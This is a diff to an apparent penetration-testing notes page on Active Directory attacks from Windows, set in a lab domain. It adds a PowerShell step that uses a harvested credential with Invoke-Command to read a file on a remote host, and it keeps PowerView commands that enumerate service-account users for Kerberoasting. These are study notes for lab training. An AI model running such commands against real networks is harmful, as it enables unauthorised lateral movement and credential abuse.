@@ -23,8 +23,10 @@ tags:
 
 !!! tip "Attacking from Windows"
 	- [Enumerating Active Directory from Windows](active-directory-from-windows-enumeration.md)
+	- [Active directory: connecting to other hosts](active-directory-connections.md)
 	- [Attacking Active Directory from Windows](active-directory-from-windows-attacks.md)
 	- [Privileges escalation in Active Directory from Windows](active-directory-from-windows-privilege-escalation.md)
+
 
 
 ## 🔐 Kerberoasting 
@@ -308,7 +310,14 @@ $Cred = New-Object System.Management.Automation.PSCredential('$domain\$userSamAc
 # Example:
 # $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\backupadm', $SecPassword)
 
-# 2. Import PowerView module and embed creds in all commands. In the example we are requesting the Service Principals. If we try without specifying the `-credential` flag, we get an error message.
+# 2. We send the nested Invoke-Command
+Invoke-Command -ComputerName "$hostname.$domainName" -Credential $cred -ScriptBlock { Get-Content "C:\Users\Administrator\Desktop\flag.txt" }
+# Example: 
+# Invoke-Command -ComputerName "MS01.INLANEFREIGHT.LOCAL" -Credential $cred -ScriptBlock { Get-Content "C:\Users\Administrator\Desktop\flag.txt" }
+```
+
+```
+# More things we can do. Import PowerView module and embed creds in all commands. In the example we are requesting the Service Principals. If we try without specifying the `-credential` flag, we get an error message.
 import-module .\PowerView.ps1
 get-domainuser -spn -credential $Cred | select samaccountname
 ```
